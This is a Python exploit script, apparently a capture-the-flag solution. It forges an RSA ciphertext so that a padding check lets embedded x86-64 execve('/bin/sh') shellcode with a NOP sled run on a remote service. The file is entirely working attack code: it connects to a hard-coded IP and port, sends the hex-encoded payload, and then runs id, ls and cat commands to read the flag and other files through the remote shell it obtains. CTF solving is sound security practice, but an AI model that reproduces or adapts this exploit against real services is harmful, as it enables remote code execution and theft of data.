#!/usr/bin/env python3

import socket
import sys
import random
import binascii
import time

N = int.from_bytes(open('naughty_or_nice','rb').read()[0x000030c0:0x00003140], byteorder='big')
e = 0x10001
#print(hex(N))

def construct_cipher():

	ncandidates = 0
	slen = 118
	shellcode = open('shellcode','rb').read()
	shellcode = b'\x90' * (slen-len(shellcode)) + shellcode
	shellcode_int = int.from_bytes(shellcode, byteorder='big')

	while True:
		cipher = (random.getrandbits((128-slen)*8-2)<<(slen*8)) + shellcode_int
		plain = pow(cipher,e,N)
		#print(hex(cipher))
		#print(hex(plain))
		plain2 = int.to_bytes(plain,128,byteorder='big')
		#print(plain2)

		if plain2[0] == 0 and plain2[1] == 2 and 0 not in list(plain2[2:11]) and 0 in list(plain2[11:]):
			i = list(plain2[11:]).index(0) + 11
			cipher2 = int.to_bytes(cipher,128,byteorder='big')
			print('Candidate cipher and plain:')
			print(cipher2)
			print(binascii.hexlify(cipher2))
			print(plain2)
			print(binascii.hexlify(plain2))

			ncandidates += 1
			print('Candidate (%d) shellcode: (%d)'%(ncandidates,i), binascii.hexlify(plain2[i:i+5]))

			if i < (128-7) and plain2[i+1] == 0xeb and plain2[i+2]&0x80 != 0:
				return cipher2,plain2

BUFSIZE = 2048

def readuntil(s,val):
	buf = b''
	while not buf.endswith(val):
		ret = s.recv(BUFSIZE)
		buf = buf + ret
		print(buf)
		print(buf.decode('ascii'))
		if len(ret) == 0:
			raise Exception('received zero bytes')

def sendall(s,buf):
	print('>>', buf)
	s.send(buf)


if __name__ == '__main__':

	'''
	c,p = construct_cipher()
	sys.exit(0)
	#'''

	c = binascii.unhexlify('0c06b25c95ea0157bb339090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05')

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	s.connect(('3.93.128.89',1207))

	readuntil(s,b'Christmas?\n')
	sendall(s,c)
	time.sleep(1)
	readuntil(s,b'\n')
	sendall(s,b'id\n')
	readuntil(s,b'\n')
	sendall(s,b'ls -al\n')
	readuntil(s,b'\n')
	sendall(s,b'cat flag\n')
	readuntil(s,b'\n')
	sendall(s,b'cat redir.sh\n')
	readuntil(s,b'\n')
